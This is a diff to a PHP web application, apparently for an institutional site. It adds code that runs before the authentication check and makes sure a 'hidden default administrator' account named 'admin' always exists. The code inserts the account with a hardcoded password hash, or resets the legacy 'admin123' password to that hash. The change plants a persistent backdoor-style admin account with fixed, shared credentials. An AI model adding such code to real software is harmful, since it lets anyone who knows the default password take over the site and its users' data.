@@ -165,6 +165,26 @@ try {
     }
 }
 
+// Ensure the hidden default administrator exists on both MySQL and SQLite.
+// Existing custom administrator passwords are preserved.
+try {
+    $defaultAdminHash = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi';
+    $stmt = $pdo->prepare("SELECT password FROM users WHERE username = ?");
+    $stmt->execute(['admin']);
+    $defaultAdmin = $stmt->fetch();
+
+    if (!$defaultAdmin) {
+        $stmt = $pdo->prepare("INSERT INTO users (username, password, full_name, email) VALUES (?, ?, ?, ?)");
+        $stmt->execute(['admin', $defaultAdminHash, 'System Administrator', 'admin@imt-unn.edu.ng']);
+    } elseif (password_verify('admin123', $defaultAdmin['password'])) {
+        // Migrate only the legacy seeded account to the current default password.
+        $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE username = ?");
+        $stmt->execute([$defaultAdminHash, 'admin']);
+    }
+} catch (PDOException $e) {
+    // Database tables have not been initialized yet; setup will create them.
+}
+
 // Helper authentication check
 function checkAuth() {
     if (!isset($_SESSION['user_id'])) {
